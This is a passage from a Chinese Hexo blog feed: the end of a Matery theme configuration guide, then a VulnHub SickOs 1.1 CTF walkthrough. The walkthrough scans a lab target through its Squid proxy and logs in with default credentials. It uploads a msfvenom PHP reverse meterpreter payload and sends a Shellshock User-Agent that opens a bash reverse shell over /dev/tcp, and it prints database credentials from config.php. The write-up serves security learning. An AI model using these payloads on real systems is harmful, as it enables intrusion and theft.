文件中。</p><h3 id="修改页脚"><a href="#修改页脚" class="headerlink" title="修改页脚"></a>修改页脚</h3><p>页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 <code>/layout/_partial/footer.ejs</code> 文件中，包括站点、使用的主题、访问量等。</p><h3 id="修改社交链接"><a href="#修改社交链接" class="headerlink" title="修改社交链接"></a>修改社交链接</h3><p>在主题的 <code>_config.yml</code> 文件中，默认支持 <code>QQ</code>、<code>GitHub</code> 和邮箱等的配置，你可以在主题文件的 <code>/layout/_partial/social-link.ejs</code> 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码：</p><pre class="line-numbers language-none"><code class="language-none">&lt;% if (theme.socialLink.github) &#123; %&gt;    &lt;a href&#x3D;&quot;&lt;%&#x3D; theme.socialLink.github %&gt;&quot; class&#x3D;&quot;tooltipped&quot; target&#x3D;&quot;_blank&quot; data-tooltip&#x3D;&quot;访问我的GitHub&quot; data-position&#x3D;&quot;top&quot; data-delay&#x3D;&quot;50&quot;&gt;        &lt;i class&#x3D;&quot;fab fa-github&quot;&gt;&lt;&#x2F;i&gt;    &lt;&#x2F;a&gt;&lt;% &#125; %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，社交图标（如：<code>fa-github</code>）你可以在 <a href="https://fontawesome.com/icons">Font Awesome</a> 中搜索找到。以下是常用社交图标的标识，供你参考：</p><ul><li>Facebook: <code>fab fa-facebook</code></li><li>Twitter: <code>fab fa-twitter</code></li><li>Google-plus: <code>fab fa-google-plus</code></li><li>Linkedin: <code>fab fa-linkedin</code></li><li>Tumblr: <code>fab fa-tumblr</code></li><li>Medium: <code>fab fa-medium</code></li><li>Slack: <code>fab fa-slack</code></li><li>Sina Weibo: <code>fab fa-weibo</code></li><li>Wechat: <code>fab fa-weixin</code></li><li>QQ: <code>fab fa-qq</code></li><li>Zhihu: <code>fab fa-zhihu</code></li></ul><blockquote><p><strong>注意</strong>: 本主题中使用的 <code>Font Awesome</code> 版本为 <code>5.11.0</code>。</p></blockquote><h3 id="修改打赏的二维码图片"><a href="#修改打赏的二维码图片" class="headerlink" title="修改打赏的二维码图片"></a>修改打赏的二维码图片</h3><p>在主题文件的 <code>source/medias/reward</code> 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。</p><h3 id="配置音乐播放器（可选的）"><a href="#配置音乐播放器（可选的）" class="headerlink" title="配置音乐播放器（可选的）"></a>配置音乐播放器（可选的）</h3><p>要支持音乐播放，在主题的 <code>_config.yml</code> 配置文件中激活music配置即可：</p><pre class="line-numbers language-none"><code class="language-none"># 是否在首页显示音乐music:  enable: true  title:         # 非吸底模式有效    enable: true    show: 听听音乐  server: netease   # require music platform: netease, tencent, kugou, xiami, baidu  type: playlist    # require song, playlist, album, search, artist  id: 503838841     # require song id &#x2F; playlist id &#x2F; album id &#x2F; search keyword  fixed: false      # 开启吸底模式  autoplay: false   # 是否自动播放  theme: &#39;#42b983&#39;  loop: &#39;all&#39;       # 音频循环播放, 可选值: &#39;all&#39;, &#39;one&#39;, &#39;none&#39;  order: &#39;random&#39;   # 音频循环顺序, 可选值: &#39;list&#39;, &#39;random&#39;  preload: &#39;auto&#39;   # 预加载，可选值: &#39;none&#39;, &#39;metadata&#39;, &#39;auto&#39;  volume: 0.7       # 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效  listFolded: true  # 列表默认折叠<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>server</code>可选<code>netease</code>（网易云音乐），<code>tencent</code>（QQ音乐），<code>kugou</code>（酷狗音乐），<code>xiami</code>（虾米音乐），</p><p><code>baidu</code>（百度音乐）。</p><p><code>type</code>可选<code>song</code>（歌曲），<code>playlist</code>（歌单），<code>album</code>（专辑），<code>search</code>（搜索关键字），<code>artist</code>（歌手）</p><pre class="line-numbers language-none"><code class="language-none">id&#96;获取方法示例: 浏览器打开网易云音乐，点击我喜欢的音乐歌单，浏览器地址栏后面会有一串数字，&#96;playlist&#96;的&#96;id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即为这串数字。</p></blockquote><h2 id="文章-Front-matter-介绍"><a href="#文章-Front-matter-介绍" class="headerlink" title="文章 Front-matter 介绍"></a>文章 Front-matter 介绍</h2><h3 id="Front-matter-选项详解"><a href="#Front-matter-选项详解" class="headerlink" title="Front-matter 选项详解"></a>Front-matter 选项详解</h3><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 <code>_config.yml</code> 中的 <code>author</code></td><td>文章作者</td></tr><tr><td>img</td><td><code>featureImages</code> 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td></tr><tr><td>hide</td><td><code>false</code></td><td>隐藏文章，如果<code>hide</code>值为<code>true</code>，则文章不会在首页显示</td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td></tr><tr><td>toc</td><td><code>true</code></td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr><tr><td>keywords</td><td>文章标题</td><td>文章关键字，SEO 时需要</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td></tr></tbody></table><blockquote><p><strong>注意</strong>:</p><ol><li>如果 <code>img</code> 属性不填写的话，文章特色图会根据文章标题的 <code>hashcode</code> 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章的特色图<strong>各有特色</strong>。</li><li><code>date</code> 的值尽量保证每篇文章是唯一的，因为本主题中 <code>Gitalk</code> 和 <code>Gitment</code> 识别 <code>id</code> 是通过 <code>date</code> 的值来作为唯一标识的。</li><li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 <code>_config.yml</code> 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：<a href="http://tool.oschina.net/encrypt?type=2">开源中国在线工具</a>、<a href="http://encode.chahuo.com/">chahuo</a>、<a href="http://tool.chinaz.com/tools/hash.aspx">站长工具</a>。</li><li>您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则</li></ol></blockquote><p>以下为文章的 <code>Front-matter</code> 示例。</p><h3 id="最简示例"><a href="#最简示例" class="headerlink" title="最简示例"></a>最简示例</h3><pre class="line-numbers language-none"><code class="language-none">---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="最全示例"><a href="#最全示例" class="headerlink" title="最全示例"></a>最全示例</h3><pre class="line-numbers language-none"><code class="language-none">---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00author: 赵奇img: &#x2F;source&#x2F;images&#x2F;xxx.jpgtop: truehide: falsecover: truecoverImg: &#x2F;images&#x2F;1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: falsemathjax: falsesummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories: Markdowntags:  - Typora  - Markdown---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="效果截图"><a href="#效果截图" class="headerlink" title="效果截图"></a>效果截图</h2><p><a href="https://camo.githubusercontent.com/ca91ff24a662fc02f64cfed3446fadc7d84dade01a698ebe3dd7b3710926489a/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d312e706e67"><img src="https://camo.githubusercontent.com/ca91ff24a662fc02f64cfed3446fadc7d84dade01a698ebe3dd7b3710926489a/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d312e706e67" alt="首页"></a></p><p><a href="https://camo.githubusercontent.com/cc39895742d9eb7a90d25b8f4935be41a4feffc034eb1e3f665316699634e5cc/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d322e706e67"><img src="https://camo.githubusercontent.com/cc39895742d9eb7a90d25b8f4935be41a4feffc034eb1e3f665316699634e5cc/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d322e706e67" alt="首页推荐文章"></a></p><p><a href="https://camo.githubusercontent.com/a19a106d92f07d240643dfb8a2712fd0b2271d3dd6e24300732f2d96aac98393/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d332e706e67"><img src="https://camo.githubusercontent.com/a19a106d92f07d240643dfb8a2712fd0b2271d3dd6e24300732f2d96aac98393/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d332e706e67" alt="首页文章列表"></a></p><p><a href="https://camo.githubusercontent.com/44cacfc83c73411a8932d19fbfb3a24f49d39676837f84691796d258dd468a83/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d372e706e67"><img src="https://camo.githubusercontent.com/44cacfc83c73411a8932d19fbfb3a24f49d39676837f84691796d258dd468a83/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d372e706e67" alt="首页文章列表"></a></p><p><a href="https://camo.githubusercontent.com/552609ffbcb915e5630e8506adda1d15fdfbcc10c2517e5e5729ac0ea22842bd/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d382e706e67"><img src="https://camo.githubusercontent.com/552609ffbcb915e5630e8506adda1d15fdfbcc10c2517e5e5729ac0ea22842bd/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d382e706e67" alt="首页文章列表"></a></p><h2 id="自定制修改"><a href="#自定制修改" class="headerlink" title="自定制修改"></a>自定制修改</h2><p>在本主题的 <code>_config.yml</code> 中可以修改部分自定义信息，有以下几个部分：</p><ul><li>菜单</li><li>我的梦想</li><li>首页的音乐播放器和视频播放器配置</li><li>是否显示推荐文章名称和按钮配置</li><li><code>favicon</code> 和 <code>Logo</code></li><li>个人信息</li><li>TOC 目录</li><li>文章打赏信息</li><li>复制文章内容时追加版权信息</li><li>MathJax</li><li>文章字数统计、阅读时长</li><li>点击页面的’爱心’效果</li><li>我的项目</li><li>我的技能</li><li>我的相册</li><li><code>Gitalk</code>、<code>Gitment</code>、<code>Valine</code> 和 <code>disqus</code> 评论配置</li><li><a href="http://busuanzi.ibruce.info/">不蒜子统计</a>和谷歌分析（<code>Google Analytics</code>）</li><li>默认特色图的集合。当文章没有设置特色图时，本主题会根据文章标题的 <code>hashcode</code> 值取余，来选择展示对应的特色图</li></ul><p><strong>我认为个人博客应该都有自己的风格和特色</strong>。如果本主题中的诸多功能和主题色彩你不满意，可以在主题中自定义修改，很多更自由的功能和细节点的修改难以在主题的 <code>_config.yml</code> 中完成，需要修改源代码才来完成。以下列出了可能对你有用的地方：</p><h3 id="修改主题颜色"><a href="#修改主题颜色" class="headerlink" title="修改主题颜色"></a>修改主题颜色</h3><p>在主题文件的 <code>/source/css/matery.css</code> 文件中，搜索 <code>.bg-color</code> 来修改背景颜色：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. *&#x2F;.bg-color &#123;    background-image: linear-gradient(to right, #4cbf30 0%, #0f9d58 100%);&#125;@-webkit-keyframes rainbow &#123;   &#x2F;* 动态切换背景颜色. *&#x2F;&#125;@keyframes rainbow &#123;    &#x2F;* 动态切换背景颜色. *&#x2F;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改-banner-图和文章特色图"><a href="#修改-banner-图和文章特色图" class="headerlink" title="修改 banner 图和文章特色图"></a>修改 banner 图和文章特色图</h3><p>你可以直接在 <code>/source/medias/banner</code> 文件夹中更换你喜欢的 <code>banner</code> 图片，主题代码中是每天动态切换一张，只需 <code>7</code> 张即可。如果你会 <code>JavaScript</code> 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，<code>banner</code> 切换的代码位置在 <code>/layout/_partial/bg-cover-content.ejs</code> 文件的 <code>&lt;script&gt;&lt;/script&gt;</code> 代码中：</p><pre class="line-numbers language-none"><code class="language-none">$(&#39;.bg-cover&#39;).css(&#39;background-image&#39;, &#39;url(&#x2F;medias&#x2F;banner&#x2F;&#39; + new Date().getDay() + &#39;.jpg)&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <code>/source/medias/featureimages</code> 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 <code>_config.yml</code> 做同步修改。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 站点搭建、Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub-SickOs-1.1渗透学习</title>
      <link href="/2022/01/19/vulnhub-sickos-1.1-shen-tou-xue-xi/"/>
      <url>/2022/01/19/vulnhub-sickos-1.1-shen-tou-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机地址：<a href="https://download.vulnhub.com/sickos/sick0s1.1.7z">https://download.vulnhub.com/sickos/sick0s1.1.7z</a></p><p>靶机难度：中级（CTF）</p><p>靶机发布日期：2015年12月11日</p><p>靶机描述：这个CTF明确地比喻了如何在网络上执行黑客策略，以在安全的环境中危害网络。 这个虚拟机与我在OSCP中遇到的实验室非常相似。 目的是破坏网络/计算机并在其上获得管理/根目录特权。</p><p>目标：得到root权限&amp;找到flag.txt</p><p>作者：F10Sec</p><p>时间：2021-07-05</p><p>请注意：</p><p>对于所有这些计算机，我已经使用VMware运行下载的计算机。我将使用Kali Linux作为解决该目标的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>我们在VM中需要确定攻击目标的IP地址，可以使用netdiscover/nmap来获取目标主机的IP地址：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">nmap <span class="token operator">-</span>sP <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">-</span>T4参数解读：<span class="token operator">-</span>sP <span class="token punctuation">:</span> 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping<span class="token operator">-</span>T4： 指定扫描过程使用的时序，总有<span class="token number">6</span>个级别（<span class="token number">0</span><span class="token operator">-</span><span class="token number">5</span>），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616298.png" alt="img"></p><p>我们已经找到了目标计算机IP地址：192.168.1.11</p><p>第一步是找出目标计算机上可用的开放端口和一些服务。因此我在目标计算机上启动了nmap全端口T5速度扫描：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">nmap <span class="token operator">-</span>sS <span class="token operator">-</span>sV <span class="token operator">-</span>sC <span class="token operator">-</span>O <span class="token operator">-</span>T5  <span class="token operator">-</span>Pn <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.11</span>参数解读：<span class="token operator">-</span>A ：启用<span class="token operator">-</span>A选项之后，Nmap将检测目标主机的下述信息        服务版本识别（<span class="token operator">-</span>sV）；        操作系统识别（<span class="token operator">-</span>O）；        脚本扫描（<span class="token operator">-</span>sC）；        Traceroute（–traceroute）<span class="token operator">-</span>sS<span class="token operator">/</span>sT<span class="token operator">/</span>sA<span class="token operator">/</span>sW<span class="token operator">/</span>sM<span class="token punctuation">:</span>指定使用 TCP SYN<span class="token operator">/</span><span class="token function">Connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span>ACK<span class="token operator">/</span>Window<span class="token operator">/</span>Maimon scans的方式来对目标主机进行扫描<span class="token operator">-</span>sV<span class="token punctuation">:</span> 指定让Nmap进行服务版本扫描<span class="token operator">-</span>p<span class="token operator">-</span>：进行全端口扫描<span class="token operator">-</span>Pn：禁用主机检测（<span class="token operator">-</span>Pn）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616592.png" alt="img"></p><table><thead><tr><th>PORT</th><th>SERVICE</th><th>VERSION DETECTION</th></tr></thead><tbody><tr><td>TCP: 22</td><td>SSH</td><td>OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)</td></tr><tr><td>TCP: 3128</td><td>HTTP-Proxy</td><td>Squid http proxy 3.1.19</td></tr><tr><td>TCP: 8080</td><td>HTTP-Proxy</td><td>http proxy 3.1.19</td></tr></tbody></table><p>目标计算机上开放了22、3128、8080三个端口。</p><h2 id="Squid-枚举"><a href="#Squid-枚举" class="headerlink" title="Squid 枚举"></a>Squid 枚举</h2><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616669.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616803.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616470.png" alt="img"></p><h2 id="Nikto-通过代理扫描"><a href="#Nikto-通过代理扫描" class="headerlink" title="Nikto 通过代理扫描"></a>Nikto 通过代理扫描</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">nikto ：开源的WEB扫描评估软件，可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等nikto <span class="token operator">-</span>h 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11 <span class="token operator">-</span>useproxy http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11:3128<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616990.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617155.png" alt="img"></p><table><thead><tr><th><a href="https://www.wappalyzer.com/technologies/web-servers/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer">Web 服务器</a></th><th>编程语言</th><th><a href="https://www.wappalyzer.com/technologies/operating-systems/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer">操作系统</a></th></tr></thead><tbody><tr><td>Apache: 2.2.22</td><td>PHP 5.3.10</td><td>Ubuntu</td></tr></tbody></table><p>Nikto 扫描发现存在<code>robots.txt</code>目录、<code>cgi-bin/status</code>（容易受到shellshock攻击），存在可利用漏洞；</p><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>这边先用开启代理，然后访问目标主机的80端口；</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617771.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617709.png" alt="img"></p><p>查看源代码没啥游泳的信息，这边是用代理来访问的80，打开robots.txt发现存在wolfcms目录；</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617365.png" alt="img"></p><p>找到/wolfcms的信息，有可能此网站是使用Wolf CMS中搭建的，也可能是个目录……..</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617306.png" alt="img"></p><p>使用搜索引擎搜索Wolf CMS，发现是个开源的CMS，在github[<a href="https://github.com/wolfcms/wolfcms]%E4%B8%8A%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E5%88%B0%E6%BA%90%E7%A0%81%E4%BF%A1%E6%81%AF%EF%BC%9B">https://github.com/wolfcms/wolfcms]上可以查看到源码信息；</a></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617175.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617808.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617256.png" alt="img"></p><h2 id="目录枚举"><a href="#目录枚举" class="headerlink" title="目录枚举"></a>目录枚举</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">gobuster <span class="token function">dir</span> <span class="token operator">-</span>u http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11/wolfcms/  <span class="token operator">-</span>w <span class="token operator">/</span>usr/share/wordlists/dirbuster/directory-list-2<span class="token punctuation">.</span>3-medium<span class="token punctuation">.</span>txt <span class="token operator">-</span>t 50 <span class="token operator">--</span>random-agent   <span class="token operator">--</span>proxy   http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11:3128<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618447.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618617.png" alt="img"></p><p>访问下/?/admin/login，这是通病…遇到Wolf cms直接能使用这个目录进入登录界面</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618975.png" alt="img"></p><p>使用账户密码admin/admin成功登录到网站后台(不要问我怎么知道的…….)</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618419.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618261.png" alt="img"></p><h2 id="上传Webshell"><a href="#上传Webshell" class="headerlink" title="上传Webshell"></a>上传Webshell</h2><h3 id="1、上传php-meterpreter-payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；"><a href="#1、上传php-meterpreter-payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；" class="headerlink" title="1、上传php meterpreter payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；"></a>1、上传php meterpreter payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；</h3><p>成功登录后，发现能上传文件，这边要使用msfvenom做PHP木马文件上传进行shell提权</p><h4 id="1、筛选payload"><a href="#1、筛选payload" class="headerlink" title="1、筛选payload"></a>1、筛选payload</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msfvenom <span class="token operator">-</span>l payload <span class="token punctuation">|</span> grep php <span class="token punctuation">|</span> grep meterpreter    筛选合适的payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618025.png" alt="img"></p><h4 id="2、生成payload"><a href="#2、生成payload" class="headerlink" title="2、生成payload"></a>2、生成payload</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msfvenom <span class="token operator">-</span>p php/meterpreter_reverse_tcp lhost=192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>7 lport=6666 <span class="token operator">-</span>o Wolfcms<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619417.png" alt="img"></p><h4 id="3、上传payload"><a href="#3、上传payload" class="headerlink" title="3、上传payload"></a>3、上传payload</h4><p>在web页面上传后记录下上传文件的路径；</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619999.png" alt="img"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">上传后文件的目录：http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11/wolfcms/public/Wolfcms<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4、Kali设置监听载荷"><a href="#4、Kali设置监听载荷" class="headerlink" title="4、Kali设置监听载荷"></a>4、Kali设置监听载荷</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">use exploit/multi/handler<span class="token function">set</span> payload php/meterpreter_reverse_tcpshow options<span class="token function">set</span> LHOST 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>7<span class="token function">set</span> LPORT 6666exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619404.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619212.png" alt="img"></p><p>注意：此时上传的php类型的Meterpreter是不具备完整功能的，因此可以继续上传对应操作系统类型的payload获取更多的操作功能；这里发现随然获取了Metrepreter会话，但是shell命令无法执行，后续使用冰蝎上传weblshell连接；</p><h3 id="2、利用冰蝎上传weblshell连接"><a href="#2、利用冰蝎上传weblshell连接" class="headerlink" title="2、利用冰蝎上传weblshell连接"></a>2、利用冰蝎上传weblshell连接</h3><p>这里必须配置好代理才可以正常连接webshell；</p><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619370.png" alt="img"></h4><h2 id="Shellshock-Bash-反向-Shell"><a href="#Shellshock-Bash-反向-Shell" class="headerlink" title="Shellshock Bash 反向 Shell"></a>Shellshock Bash 反向 Shell</h2><p>Burp Suite 用于操作 User-Agent：包括 bash 反向 shell。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> ignored<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">/</span>bin/bash <span class="token operator">-</span>i >&amp; <span class="token operator">/</span>dev/tcp/192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>221<span class="token punctuation">.</span>139/443 0>&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619992.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619018.png" alt="img"></p><p>查看/var/www/wolfcms/目录下的config.php文件；</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token operator">/</span><span class="token operator">/</span> Database settings:<span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'DB_DSN'</span><span class="token punctuation">,</span> <span class="token string">'mysql:dbname=wolf;host=localhost;port=3306'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'DB_USER'</span><span class="token punctuation">,</span> <span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'DB_PASS'</span><span class="token punctuation">,</span> <span class="token string">'john@123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">define</span><span class="token punctuation">(</span><span 